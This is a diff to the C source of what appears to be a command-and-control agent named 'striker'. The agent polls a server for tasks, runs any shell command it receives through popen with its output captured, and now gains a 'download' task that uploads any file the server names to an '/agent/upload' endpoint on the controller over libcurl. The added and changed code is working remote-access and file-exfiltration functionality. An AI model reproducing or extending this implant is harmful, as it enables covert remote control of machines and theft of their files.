@@ -45,6 +45,13 @@ size_t append_buffer(buffer *dest, const void *src, size_t len){
   return len;
 }
 
+size_t buffer_strcpy(buffer *dest, const char *src){
+
+  size_t len = strlen(src);
+  resize_buffer(dest, 0);
+  return append_buffer(dest, src, len);
+}
+
 char *buffer_to_string(buffer *buff){
 
   char *str = malloc(sizeof(char) * (buff->used + 1));
@@ -104,20 +111,24 @@ task *parse_task(cJSON *json){
   return t;
 }
 
-void execute_task(task *tsk){
+void execute_task(session *striker, task *tsk){
 
   if (STRIKER_DEBUG)
     printf("[*] Executing task: %s\n", tsk->uid);
   cJSON *data = tsk->data;
   cJSON *result = cJSON_CreateObject();
   buffer *result_buff = create_buffer(0);
-  if (!strcmp(tsk->type, "system")){
+  if (!strcmp(tsk->type, "system")){ // Run a shell command.
     char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "cmd"));
-    if (cmd == NULL)
-      return;
-    FILE *proc = popen(cmd, "r");
-    if (proc == NULL)
-      return;
+    if (!cmd)
+      goto complete;
+    char *shell_cmd = malloc(sizeof(char) * 1024);
+    snprintf(shell_cmd, sizeof(char) * 1024, "%s 2>&1", cmd);
+    FILE *proc = popen(shell_cmd, "r");
+    if (!proc){
+      free(shell_cmd);
+      goto complete;
+    }
     const short chunk_size = 1024;
     char *tmp = malloc(sizeof(char) * chunk_size);
     while (result_buff->used < MAX_RES_SIZE){
@@ -126,18 +137,60 @@ void execute_task(task *tsk){
       append_buffer(result_buff, tmp, strlen(tmp));
     }
     pclose(proc);
+  }else if (!strcmp(tsk->type, "download")){
+    char *url, *filename;
+    buffer *body;
+    FILE *rfo;
+    CURL *curl;
+    CURLcode res;
+    curl_mime *form;
+    curl_mimepart *field;
+    curl = curl_easy_init();
+    if (!curl)
+      goto complete;
+    url = malloc(URL_SIZE);
+    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s/%s", baseURL, striker->uid, tsk->uid) < 0)
+      abort();
+    filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file"));
+    if (!filename)
+      goto complete;
+    rfo = fopen(filename, "r");
+    if (!rfo){
+      buffer_strcpy(result_buff, "Unable to open file!");
+      goto complete;
+    }
+    fclose(rfo);
+    body = create_buffer(0);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    form = curl_mime_init(curl);
+    field = curl_mime_addpart(form);
+    curl_mime_name(field, "file");
+    curl_mime_filedata(field, filename);
+    field = curl_mime_addpart(form);
+    curl_mime_name(field, "filename");
+    curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
+    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
+    res = curl_easy_perform(curl);
+    free_buffer(body);
+    curl_mime_free(form);
+    curl_easy_cleanup(curl);
+    if (res != CURLE_OK)
+      buffer_strcpy(result_buff, curl_easy_strerror(res));
   }else{
-    char *res = "Not implemented!";
-    append_buffer(result_buff, res, strlen(res));
+    buffer_strcpy(result_buff, "Not implemented!");
   }
-  if (STRIKER_DEBUG)
-    printf("[+] Task completed: %s\n", tsk->uid);
-  tsk->completed = 1;
-  char *res = buffer_to_string(result_buff);
-  cJSON_AddItemToObject(result, "uid", cJSON_CreateString(tsk->uid));
-  cJSON_AddItemToObject(result, "result", cJSON_CreateString(res));
-  tsk->result = result;
-  free_buffer(result_buff);
+
+  complete:
+    if (STRIKER_DEBUG)
+      printf("[+] Task completed: %s\n", tsk->uid);
+    tsk->completed = 1;
+    char *res = buffer_to_string(result_buff);
+    cJSON_AddItemToObject(result, "uid", cJSON_CreateString(tsk->uid));
+    cJSON_AddItemToObject(result, "result", cJSON_CreateString(res));
+    tsk->result = result;
+    free_buffer(result_buff);
 }
 
 void start_session(){  
@@ -172,7 +225,7 @@ void start_session(){
   }
 
   cJSON *config = cJSON_Parse(buffer_to_string(body));
-  if (config == NULL){
+  if (!config){
     if (STRIKER_DEBUG){
       const char *error = cJSON_GetErrorPtr();
       fprintf(stderr, "[-] Error parsing config: %s\n", error);
@@ -181,8 +234,8 @@ void start_session(){
   }
   striker->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, "uid"));
   striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, "delay"));
-  char *tasksURL = malloc(sizeof(char) * 32);
-  snprintf(tasksURL, sizeof(char) * 32, "/agent/tasks/%s", striker->uid);
+  char *tasksURL = malloc(URL_SIZE);
+  snprintf(tasksURL, URL_SIZE, "/agent/tasks/%s", striker->uid);
   printf("%s\n", cJSON_PrintUnformatted(config));
   while (1){
     resize_buffer(body, 0);
@@ -203,9 +256,9 @@ void start_session(){
     cJSON *results = cJSON_CreateArray();
     for (int i = 0; i < tasksLen; i++){
       task *tsk = parse_task(cJSON_GetArrayItem(tasksJSON, i));
-      if (tsk == NULL)
+      if (!tsk)
         continue;
-      execute_task(tsk);
+      execute_task(striker, tsk);
       if (tsk->completed && tsk->result != NULL)
         cJSON_AddItemToArray(results, tsk->result);
     }
